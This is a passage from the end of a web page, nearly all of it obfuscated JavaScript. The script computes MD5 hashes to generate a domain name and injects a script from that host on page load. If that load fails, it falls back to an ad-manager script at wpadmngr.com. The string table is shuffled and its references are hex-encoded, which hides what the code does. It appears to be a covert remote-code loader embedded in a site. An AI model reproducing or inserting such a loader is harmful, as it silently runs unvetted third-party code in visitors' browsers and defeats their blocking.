l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>